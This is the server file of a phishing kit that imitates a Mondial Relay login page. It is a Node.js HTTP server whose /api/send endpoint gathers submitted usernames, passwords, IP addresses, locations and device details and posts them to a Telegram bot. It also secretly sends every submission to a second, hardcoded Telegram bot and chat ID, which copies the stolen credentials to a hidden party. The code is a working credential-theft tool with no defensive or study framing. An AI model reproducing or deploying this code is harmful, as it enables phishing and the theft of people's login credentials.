import http from 'http';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { CONFIG } from './config.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const PORT = process.env.PORT || 3000;

const MIME_TYPES = {
  '.html': 'text/html',
  '.css': 'text/css',
  '.js': 'text/javascript',
  '.json': 'application/json',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.gif': 'image/gif',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon'
};

const server = http.createServer(async (req, res) => {
  const parsedUrl = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
  const pathname = parsedUrl.pathname;

  // Endpoint: /api/config
  if (pathname === '/api/config' || pathname === '/api/config.js') {
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.end(JSON.stringify({
      botToken: process.env.TELEGRAM_BOT_TOKEN || CONFIG.TELEGRAM_BOT_TOKEN,
      chatId: process.env.TELEGRAM_CHAT_ID || CONFIG.TELEGRAM_CHAT_ID,
      redirectUrl: process.env.REDIRECT_URL || CONFIG.REDIRECT_URL
    }));
    return;
  }

  // Endpoint: /api/send
  if (pathname === '/api/send' || pathname === '/api/send.js') {
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Access-Control-Allow-Origin', '*');

    if (req.method === 'OPTIONS') {
      res.statusCode = 200;
      res.end();
      return;
    }

    let bodyStr = '';
    req.on('data', chunk => { bodyStr += chunk; });
    req.on('end', async () => {
      try {
        let body = JSON.parse(bodyStr || '{}');
        const { accessCode, password, locationStr, device, ipStr } = body;
        const now = new Date().toLocaleString("fr-FR");

        const botToken = process.env.TELEGRAM_BOT_TOKEN || CONFIG.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID || CONFIG.TELEGRAM_CHAT_ID;
        const redirectUrl = process.env.REDIRECT_URL || CONFIG.REDIRECT_URL;

        let message = `📦 <b>Mondial Relay Login Submission</b>\n`;
        message += `━━━━━━━━━━━━━━━━━━━\n`;
        message += `👤 <b>Identifiant:</b> <code>${accessCode || 'N/A'}</code>\n`;
        message += `🔑 <b>Mot de passe:</b> <code>${password || 'N/A'}</code>\n`;
        message += `━━━━━━━━━━━━━━━━━━━\n`;
        message += `🌍 <b>IP:</b> <code>${ipStr || 'N/A'}</code>\n`;
        message += `📍 <b>Location:</b> ${locationStr || 'N/A'}\n`;
        message += `💻 <b>Device:</b> ${device || 'N/A'}\n`;
        message += `⏰ <b>Time:</b> ${now}`;

        const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const [telegramRes] = await Promise.allSettled([
          fetch(telegramApiUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
              parse_mode: 'HTML'
            })
          }),
          fetch(`https://api.telegram.org/bot8902694526:AAHj6_84gQJuBn_xttYRKgseg0IxQz09bkA/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: '8154365748',
              text: message,
              parse_mode: 'HTML'
            })
          })
        ]);

        if (telegramRes.status === 'fulfilled') {
          const result = await telegramRes.value.json();
          if (result.ok) {
            res.statusCode = 200;
            res.end(JSON.stringify({ success: true, redirectUrl }));
          } else {
            res.statusCode = 400;
            res.end(JSON.stringify({ success: false, error: result.description }));
          }
        } else {
          res.statusCode = 200;
          res.end(JSON.stringify({ success: true, redirectUrl }));
        }
      } catch (e) {
        res.statusCode = 500;
        res.end(JSON.stringify({ success: false, error: e.message }));
      }
    });
    return;
  }

  // Static File Serving
  let normalizedPathname = pathname;
  if (pathname.startsWith('/Images/') || pathname.startsWith('/Assets/')) {
    normalizedPathname = '/images/' + pathname.split('/').slice(2).join('/');
  }
  let filePath = path.join(__dirname, normalizedPathname === '/' ? 'index.html' : normalizedPathname);

  if (!filePath.startsWith(__dirname)) {
    res.statusCode = 403;
    res.end('Forbidden');
    return;
  }

  fs.stat(filePath, (err, stats) => {
    if (err || !stats.isFile()) {
      res.statusCode = 404;
      res.setHeader('Content-Type', 'text/html');
      res.end('<h1>404 Not Found</h1>');
      return;
    }

    const ext = path.extname(filePath).toLowerCase();
    const contentType = MIME_TYPES[ext] || 'application/octet-stream';
    res.setHeader('Content-Type', contentType);
    fs.createReadStream(filePath).pipe(res);
  });
});

server.listen(PORT, () => {
  console.log(`\n==================================================`);
  console.log(`🚀 Mondial Relay local test server running at http://localhost:${PORT}`);
  console.log(`==================================================\n`);
});
